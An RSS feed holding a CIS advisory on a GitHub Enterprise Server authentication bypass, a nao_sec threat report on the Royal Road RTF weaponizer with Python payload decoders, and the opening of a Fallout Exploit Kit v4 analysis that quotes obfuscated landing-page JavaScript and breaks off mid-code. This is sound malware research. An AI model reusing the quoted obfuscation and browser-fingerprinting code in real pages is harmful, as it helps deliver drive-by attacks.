<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>Cyble</title>
<link>https://cyble.com</link>


<item>
<title>A Vulnerability in GitHub Enterprise Server (GHES) Could Allow for Authentication Bypass</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in GitHub Enterprise Server (GHES), which could allow for authentication bypass. GHES is a popular platform for software developers. Organizations can build and store software applications using Git version control and automate deployment pipelines. Successful exploitation of this vulnerability could allow for an attacker to forge a SAML response to provision and/or gain access to a user with site administrator privileges. An attacker could then view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Thu, 23 May 2024 16:45:55 -0400</pubDate>
</item>
<item>
<title>Royal Road! Re:Dive</title>
<link>http://nao-sec.org/2021/01/royal-road-redive.html</link>
<guid>http://nao-sec.org/2021/01/royal-road-redive.html</guid>
<content:encoded><![CDATA[
<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/00.png" /></p>

<h2 id="abstract">Abstract</h2>
<p>We introduced the “Royal Road RTF Weaponizer” in our previous blog [1] (and presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020). Royal Road is a tool shared by many targeted attack groups believed to belong to China. It’s been a year since our previous blog, and Royal Road is still in use. Here, we will introduce the Royal Road-related attacks observed during 2020.</p>

<h2 id="previous-blog">Previous Blog</h2>
<p>Let’s briefly review the previous blog. Royal Road is a tool that generates RTF files that exploit the Microsoft Office Equation Editor vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802). The details of the tool are unknown, but the RTF file generated by it has various characteristics. The definition of “RTF file generated by Royal Road” may vary from researcher to researcher. Therefore, we define a file that meets the following conditions as an “RTF file generated by Royal Road”.</p>

<ol>
  <li>Exploiting a vulnerability in Microsoft Office Equation Editor</li>
  <li>Containing an object named “8.t”</li>
</ol>

<p>However, some RTF files are likely to be related to Royal Road, even though they don’t meet the second condition. For classification purposes, we refer to this as “Related Samples”. In reality, this may also be an RTF file generated by Royal Road, but the truth is only known to the attacker. Due to the our research, we have divided these into “Royal Road Samples” and “Related Samples”. However, they are treated the same in the specific case studies below.</p>

<p>And Royal Road is shared among various attack groups believed to belong to China. Specifically, it is believed to be used by the following attack groups. The attack group alias is written for reference. Strictly speaking, these can be different. For example, TA428 and Pirate Panda are not exactly equivalent.</p>

<ol>
  <li>Temp.Tick (BRONZE BUTLER, RedBaldKnight)</li>
  <li>Temp.Conimes (Goblin Panda, Cycldek)</li>
  <li>Temp.Periscope (Leviathan, APT40)</li>
  <li>Temp.Trident (Dagger Panda, IceFog)</li>
  <li>Tonto (Karma Panda, CactusPete, LoneRanger)</li>
  <li>TA428 (Pirate Panda)</li>
  <li>Rancor</li>
</ol>

<p>Also, we categorized the various characteristics of the RTF files used by these groups and showed what they have in common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/01.png" /></p>

<h2 id="updates">Updates</h2>
<p>It’s been a year since we introduced Royal Road. In the meantime, the RTF file, believed to have been generated by Royal Road, has been used many times in targeted attacks, and several updates have been observed. First of all, we will introduce the updates.</p>

<p>The RTF file generated by Royal Road contains encoded malware. It is decoded by Shellcode after exploit. In our previous blog, we introduced the following 5 encodings.</p>

<ol>
  <li>4D 5A 90 00  (not encoded)</li>
  <li>F2 A3 20 72</li>
  <li>B2 A6 6D FF</li>
  <li>B0 74 77 46</li>
  <li>B2 5A 6F 00</li>
</ol>

<p>Many of the RTF files we observed in 2020 used the 3rd and 4th encodings. However, a few samples used the new encodings. The following 2 encodings.</p>

<ol>
  <li>A9 A4 6E FE</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/02.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(((</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>  <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>94 5F DA D8</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/03.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">xor_key</span> <span class="o">=</span> <span class="mi">1387678300</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">x0</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x20000000</span>
        <span class="n">x1</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
        <span class="n">x2</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="n">x3</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">x0</span> <span class="o">^</span> <span class="n">x1</span> <span class="o">^</span> <span class="n">x2</span><span class="p">)</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">+</span> <span class="n">xor_key</span><span class="p">)</span> <span class="o">+</span> <span class="n">x3</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">%</span> <span class="mi">256</span><span class="p">))</span>
</code></pre></div></div>

<p>Our tool for decrypting Royal Road encoded object is already available on GitHub. It also supports the above new encodings.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="new-attack-groups">New Attack Groups</h2>
<p>As we mentioned earlier, several attack groups use Royal Road. The following eight attack groups have been observed to use Royal Road (including both Royal Road Samples and Related Samples) during 2020.</p>

<ol>
  <li>Temp.Conimes</li>
  <li>Tonto</li>
  <li>TA428</li>
  <li>Naikon</li>
  <li>Higaisa</li>
  <li>Vicious Panda</li>
  <li>FunnyDream</li>
  <li>TA410</li>
</ol>

<p>Of these, we have already reported on 1-3 attack groups in our previous blog. Temp.Conimes used NewCore RAT to attack Vietnamese organizations. Tonto used Bisonal to attack organizations in East Asia such as Russia.</p>

<p>And the TA428 was also particularly active, using PoisonIvy, Cotx RAT, Tmanger, and nccTrojan to attack East Asian organizations such as Mongolia. We will not cover these individual cases here, but if you are interested, see the IOC chapter. For TA428, the paper [2] and blogs [3][4][5] are available from NSJ (NTT Security Japan). Please refer to that.</p>

<p>For Naikon, CheckPoint Research reported [6], but unfortunately, we could not observe this. Therefore, in the following, we will introduce attack cases related to Royal Road for four groups (5-8).</p>

<h3 id="higaisa">Higaisa</h3>
<p>Higaisa is an attack group that seems to have been active since at least around 2016. It is primarily targeted at North Korean-related organizations and is believed to be aimed at stealing information using AttackBot, PIZ Stealer, and Gh0st RAT.</p>

<p>The blogs have been written by Tencent and Positive Technologies so far [7][8][9], and are attributed to (South) Korea. However, NSJ’s paper [10] showed a connection with Ghost Dragon [11] and PKPLUG [12], and it was reported that it might belong to China.</p>

<p>We observed an attack by Higaisa on Royal Road in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/04.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/05.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/06.png" /></p>

<p>The malware executed by the Royal Road RTF was AttackBot. AttackBot is a downloader that has been used by Higaisa since at least April 2018.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/07.png" /></p>

<h3 id="vicious-panda">Vicious Panda</h3>
<p>Vicious Panda is an attack group reported by CheckPoint Research in March 2020 [13]. It is said to belong to China and targets East Asia such as Russia, Mongolia, and Ukraine.</p>

<p>We observed an attack on the Royal Road by Vicious Panda in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/08.png" /></p>

<p>It has been reported to execute malware similar to Enfal and BYEBY.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/09.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/10.png" /></p>

<h3 id="funnydream">FunnyDream</h3>
<p>FunnyDream is an attack group that is said to have been active since around 2018. It is said to belong to China and targets Southeast Asia such as Vietnam and Malaysia. FunnyDream uses Chinoxy and FunnyDream Backdoor. BitDefender has published a detailed report [14] on FunnyDream.</p>

<p>We observed an attack by FunnyDream from March to May 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/11.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/12.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/13.png" /></p>

<p>Chinoxy is a RAT that has been used by FunnyDream since around 2018. It decoded the config using two numeric data and communicates with the C&amp;C server using its original protocol using Blowfish.</p>

<h3 id="ta410">TA410</h3>
<p>TA410 is an attack group that is said to have been active since around 2016. It is said to belong to China and is suspected to be related to APT10. The report has been published by Proofpoint [15][16][17] and is mainly targeted at public sector in the US. It uses malware called LockBack and FlowCloud.</p>

<p>We observed an attack by TA410 in October 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/15.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/16.png" /></p>

<p>FlowCloud is a RAT reported by Proofpoint in June 2020. FlowCloud has been reported to be v4 and v5, but the FlowCloud we observed at this time was similar to v4.</p>

<h2 id="attack-case-against-japan">Attack case against Japan</h2>
<p>In addition to the four attack groups shown so far (Higaisa, Vicious Panda, FunnyDream, TA410), attacks that appear to be related to Royal Road have been observed. Among them, we will introduce an example of attacks on Japan. We are not able to identify which attack group made this attack. If you have any knowledge about it, please share it with us…</p>

<p>The attack on Japan took place in November 2020. The attack began with 2 RTF files attached to the email.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/18.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/19.png" /></p>

<p>These RTF files did not contain an 8.t object, however  did contain an associated object. This is the malware encoded by the 4th (B0 74 77 46) encoding shown above.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/20.png" /></p>

<p>The overall picture of the attack is as follows.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/21.png" /></p>

<p>The malware executed was an unknown RAT. We call this XLBug RAT because of the characteristics left in this RAT. The RAT held information such as C&amp;C server encoded by Base64 and XOR.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/22.png" /></p>

<p>The following commands are implemented in XLBug RAT.</p>

<ul>
  <li>Get directory information</li>
  <li>Get file information</li>
  <li>Get computer information</li>
  <li>Execute file</li>
  <li>Upload file</li>
  <li>Download file</li>
  <li>Rename file</li>
  <li>Delete file</li>
  <li>Delete itself</li>
</ul>

<p>The naming convention and encoding of the encoded object contained in the RTF are similar to those of the TA428. However, we could not say that this was a TA428 attack.</p>

<h2 id="relationship">Relationship</h2>
<p>In the previous blog, we summarized the characteristics of attack groups that use Royal Road. We used it to divide the attack groups into two groups. However, by 2020, those characteristics are almost meaningless. It has been standardized or deleted. It’s not as easy to group as it used to be. In the first place, the groups sharing Royal Road should be close. We do not classify further, but if you have any comments please let us know.</p>

<h2 id="yara-rule">Yara Rule</h2>
<p>The GitHub repository we shared in the previous blog is still being updated.</p>

<p><a href="https://github.com/nao-sec/yara_rules">https://github.com/nao-sec/yara_rules</a></p>

<h2 id="ioc">IOC</h2>
<p>The IOC sheet shared in the previous blog is still being updated.</p>

<p><a href="https://nao-sec.org/jsac2020_ioc.html">https://nao-sec.org/jsac2020_ioc.html</a></p>

<h2 id="tool">Tool</h2>
<p>The tool used by Royal Road to decrypt encoded object is still being updated.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="wrap-up">Wrap-Up</h2>
<p>The attacks using Royal Road have decreased compared to 2019, but are still ongoing. There are many cases of attacks by TA428 and Tonto, but other attacks by different attack groups (Higaisa, Vicious Panda, FunnyDream, TA410) have also been observed.</p>

<p>The attacks on Japan have also been observed and we were unable to identify this with a known attack group. The use of Royal Road by these unknown attack groups is expected to continue.</p>

<p>In addition to Royal Road, there are other cases, such as the Tmanger family, that appear to share tools among multiple targeted attack groups. We should continue to pay close attention to these tool sharing cases.</p>

<h2 id="acknowledgments">Acknowledgments</h2>
<p>“nao_sec” is an independent research team that does not belong to any company. Individuals belong to each company and engage in research, but the activities of nao_sec still maintain their independence from each company. We are grateful to all of you who cooperated with our research activities every day.</p>

<hr />

<h2 id="references">References</h2>
<p>[1] nao_sec, “An Overhead View of the Royal Road”, https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html<br />
[2] NTT Security Japan, “Operation LagTime IT: colourful Panda footprint”, https://vblocalhost.com/uploads/VB2020-Ozawa-etal.pdf<br />
[3] NTT Security Japan, “Panda’s New Arsenal: Part 1 Tmanger”, https://insight-jp.nttsecurity.com/post/102gi9b/pandas-new-arsenal-part-1-tmanger<br />
[4] NTT Security Japan, “Panda’s New Arsenal: Part 2 Albaniiutas”, https://insight-jp.nttsecurity.com/post/102gkfp/pandas-new-arsenal-part-2-albaniiutas<br />
[5] NTT Security Japan, “Panda’s New Arsenal: Part 3 Smanager”, https://insight-jp.nttsecurity.com/post/102glv5/pandas-new-arsenal-part-3-smanager<br />
[6] CheckPoint Research, “Naikon APT: Cyber Espionage Reloaded”, https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/<br />
[7] Tencent, “APT攻击组织”黑格莎（Higaisa）”攻击活动披露”, https://s.tencent.com/research/report/836.html<br />
[8] Tencent, ““Higaisa（黑格莎）”组织近期攻击活动报告”, https://s.tencent.com/research/report/895.html<br />
[9] Positive Technologies, “COVID-19 и новогодние поздравления: исследуем инструменты группировки Higaisa”, https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/covid-19-i-novogodnie-pozdravleniya-issleduem-instrumenty-gruppirovki-higaisa/<br />
[10] NTT Security Japan, “Crafty Panda 標的型攻撃解析レポート”, https://www.nttsecurity.com/docs/librariesprovider3/default-document-library/craftypanda-analysis-report<br />
[11] Cylance (BlackBerry), “The Ghost Dragon”, https://blogs.blackberry.com/en/2016/04/the-ghost-dragon<br />
[12] Palo Alto Networks, “PKPLUG: Chinese Cyber Espionage Group Attacking Southeast Asia”, https://unit42.paloaltonetworks.com/pkplug_chinese_cyber_espionage_group_attacking_asia/<br />
[13] CheckPoint Research, “Vicious Panda: The COVID Campaign”, https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/<br />
[14] BitDefender, “A Detailed Timeline of a Chinese APT Espionage Attack Targeting South Eastern Asian Government Institutions”, https://labs.bitdefender.com/2020/11/a-detailed-timeline-of-a-chinese-apt-espionage-attack-targeting-south-eastern-asian-government-institutions/<br />
[15] Proofpoint, “LookBack Malware Targets the United States Utilities Sector with Phishing Attacks Impersonating Engineering Licensing Boards”, https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks<br />
[16] Proofpoint, “LookBack Forges Ahead: Continued Targeting of the United States’ Utilities Sector Reveals Additional Adversary TTPs”, https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals<br />
[17] Proofpoint, “TA410: The Group Behind LookBack Attacks Against U.S. Utilities Sector Returns with New Malware”, https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new</p>
]]></content:encoded>
<pubDate>2021-01-04T15:00:00+00:00</pubDate>
</item>
<item>
<title>Steady Evolution of Fallout v4</title>
<link>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</link>
<guid>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We have been observing the Fallout Exploit Kit since August 2018. Fallout is using non-characteristic URL and heavily obfuscated landing page. The user still exists and attacks are observed daily. Recently, we were investigating an attack campaign that infects Raccoon Stealer in the flow of PopAds-&gt; KeitaroTDS-&gt; Fallout.</p>

<p>About Fallout, we have already written three reports. The first one was about the emergence of Fallout, the second one was to start using PowerShell and the third one was to start exploiting PoC on GitHub. We divide these major changes by version and call them v1~3.</p>

<ul>
  <li><a href="https://nao-sec.org/2018/09/hello-fallout-exploit-kit.html">Hello “Fallout Exploit Kit”</a></li>
  <li><a href="https://nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In-Depth analysis of new Fallout Exploit Kit</a></li>
  <li><a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></li>
</ul>

<p>We wrote about v3 in March 2019. v3 is not stable and has been updated to the next version immediately. @EKFiddle (created and maintained by @jeromesegura) reported this change on April 11.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en"><a href="https://twitter.com/hashtag/EKFiddle?src=hash&amp;ref_src=twsrc%5Etfw">#EKFiddle</a> [Regex update]: <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a><br />Seems like there is no more use of the PoC on GitHub for CVE-2018-8174.<br />Pushing <a href="https://twitter.com/hashtag/GandCrab?src=hash&amp;ref_src=twsrc%5Etfw">#GandCrab</a> in this particular instance.<a href="https://t.co/U67qZosp1e">https://t.co/U67qZosp1e</a> <a href="https://t.co/buVTakYuhJ">pic.twitter.com/buVTakYuhJ</a></p>&mdash; EKFiddle (@EKFiddle) <a href="https://twitter.com/EKFiddle/status/1116134534989238272?ref_src=twsrc%5Etfw">2019年4月11日</a></blockquote>


<p>We call this a big update v4 (it is still v4). Detailed analysis report has not been written about what kind of update Fallout has done. However, this update is very big. At least for us (Exploit Kit analyst), that made the analysis very cumbersome. Fallout v4 incorporates the following features.</p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Diffie-Hellman key exchange
<span class="p">2.</span> VM detection
<span class="p">3.</span> Process detection
</code></pre></div></div>

<p>Here, we will share detailed analysis results on the updates made by Fallout v4. But unfortunately, we did not understand everything. If you are aware of it, please help us.</p>

<h2 id="traffic-chain">Traffic chain</h2>
<p>First, let’s look at the previous traffic chain. v1~3 was like this.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-eXpYD_rUFwU/W4loVPM1TTI/AAAAAAAAAVI/XuE3p36q7QMAVw95gBYPkKOA-IhsdaoAQCLcBGAs/s1600/0.png" />
<img alt="" src="https://3.bp.blogspot.com/-_qnvJOfIOeE/XEiKt9Zs16I/AAAAAAAAAYI/tspkgYcwxe0YjeGhaTGofsUBpfmhjJzmwCLcBGAs/s1600/0.png" />
<img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<p>In v3, it acquired PoC of CVE-2018-8174 from GitHub, and attacked by rewriting the part of shellcode. So what kind of traffic chain is v4?</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/01.png" /></p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Landing Page
<span class="p">2.</span> JavaScript Code
<span class="p">3.</span> Encoded Code 1
<span class="p">4.</span> Encoded Code 2 (CVE-2018-8174 + SWF Loader)
<span class="p">5.</span> CVE-2018-15982
<span class="p">6.</span> PowerShell Code
<span class="p">7.</span> Malware
</code></pre></div></div>

<p>In this way, an attack is performed by seven traffics. Let’s look at each one in order. (In the following, we will use different traffic data from the above. The detailed reason will be mentioned later, but it is difficult to capture and analyze traffic at the same time)</p>

<h2 id="landing-page--js-code--encoded-data">Landing Page + JS Code + Encoded Data</h2>
<p>In the landing page, JavaScript code is read first.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/04_09_2003/Symposium?Peristele=02_03_1943&amp;LE3r=Aps&amp;ILZhH=Frazzling-Anorexias"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>This includes CryptoJS and BigInteger obfuscated. Excluding the large library parts, there is very little processing.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// key</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">III1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">8b69cbdfc5fe43e69b7920c8ee721fc9</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// iv</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">II1ll11I</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">301ae8205ddcd5897df69e3b0c056c34</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">l11llIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">p4N9IqH/oiAKHkDCR0zXXfrvhwVrVPsFZSNUjkVFXxxBofjpd5JLM1sdAega3oRy</span><span class="dl">"</span><span class="p">,</span> <span class="nx">III1l1</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">II1ll11I</span>
<span class="p">})[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>First, two data (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) will appear. This is a key and an IV for AES encryption. By decrypting the next Base64 character string using these keys and IV, the necessary data (specifically, the URL for acquiring encoded data used in the next step) can be obtained. . When it tries decoding, it becomes like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/02.png" /></p>

<p>Next is the process of checking which browser is being used. Depending on it, Opera, Firefox, IE or Chrome is investigated.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check browser</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">String</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1l1IlI</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">addons</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opera</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2"> OPR/</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">InstallTrigger</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">documentMode</span><span class="dl">"</span><span class="p">])</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">runtime</span><span class="dl">"</span><span class="p">])</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Then there is a process to check the version of Adobe Flash Player. This data will be used later.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ShockwaveFlash.ShockwaveFlash</span><span class="dl">'</span><span class="p">).</span><span class="nx">getVariable</span><span class="p">(</span><span class="dl">'</span><span class="s1">$version</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>The process then returns to the landing page. In the landing page, one function is defined and executed. Let’s look at that function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B</span>
